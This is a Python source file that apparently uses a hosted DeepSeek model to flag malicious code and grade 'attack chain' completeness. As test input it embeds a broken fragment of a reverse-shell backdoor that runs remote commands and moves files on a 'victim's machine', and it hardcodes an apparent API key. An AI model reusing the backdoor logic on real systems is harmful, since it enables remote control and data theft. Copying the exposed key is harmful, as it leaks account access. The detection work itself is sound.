import os
from openai import OpenAI

class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )

    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content


    def malicious_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are any malicious behaviors, such as backdoor, trojan, ransomware, etc."
                "if there are, please list the malicious behaviors. if not, please reply 'No malicious behaviors found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content
    
    def true_attack_check(self, code_snippet,function_descriptions=None,data_flow_info=None):
        completion = self.client.chat.completions.create(
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and its sub-functions' behavior descriptions and data source.  You need to determine whether this code contains malicious behavior. if not, please reply 'No real attack detected' and the reason."
                "Note: if a sub-function has description, it means that this sub-function has been completed."
                },
                {"role": "user", "content": code_snippet,"function_descriptions": function_descriptions,"data_flow_info": data_flow_info}
            ]
        )
        return completion.choices[0].message.content
    # Key Evaluation Principles：
                # 1、Focus on Intent Over Implementation: Even if the code has syntax errors, missing imports, or other technical issues, it should be considered malicious if the attack chain is complete
                # 2、Functional Module Completeness: Assess whether core malicious functional modules are complete
                # 3、Logical Chain Coherence: Whether each attack phase forms a coherent logical chain
    
    def malicious_assertion(self, code_snippet):
        completion = self.client.chat.completions.create(
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": 
                """You are a professional cybersecurity analyst tasked with analyzing code snippets from victim's perspective to classify given code snippets.
                Follow this structured assessment framework:
                
                Classification:
                1. Full Attack Chain:
                    Definition: A self-contained, operationally-ready attack that integrates all necessary stages. It demonstrates a logical, end-to-end sequence of malicious activity.
                    Key Differentiator: Completeness and immediate operability. You should identify a seamless, integrated workflow from start to finish with no missing critical stages.
                2. Core Attack Chain:
                    Definition: Contains the essential, high-impact malicious components that form the backbone of an attack (e.g., a vulnerability exploit and a payload dropper), but is missing one or more key operational stages (e.g., a command & control channel). It has a high potential to evolve into a Full Attack Chain with moderate additional effort, such as integrating a few missing modules.
                    Key Differentiator: Core malice is present but the operational loop is incomplete. You should identify clear malicious modules but also recognize the absence of key stages that prevent it from being a standalone threat.
                3. Fragmented Attack Chain:
                    Definition: Consists of isolated, standalone malicious code fragments or modules (e.g., a single suspicious script, a payload stub, or an exploit function). These elements lack logical connectivity and a demonstrable sequence of execution. There is no evidence of an integrated, end-to-end attack flow.
                    Key Differentiator: Isolated malice without integration. You should recognize individual malicious capabilities but note the complete absence of a connecting logic or workflow between them.
                4. Benign Artifact:
                    Definition: Exhibits no evidence of malicious intent, functionality, or code. Its behavior, code patterns, and purpose are consistent with and fully explainable by legitimate activities, such as system administration, software development, debugging, or authorized security research. 
                    Key Differentiator: Fully explainable by legitimate purposes. You should find zero indicators of malice and be able to attribute all components and behaviors to known, benign activities.
                
                Provide structured response with:
                - **Classification:** "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact"
                - **Missing Components:** If classified as "Core" or "Fragmented", specify what is missing to reach the next level.
                - **Potential Impact:** Describe the potential impact if this attack were fully realized.
                - **Threat Level:** High/Medium/Low based on current implementation"""
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)
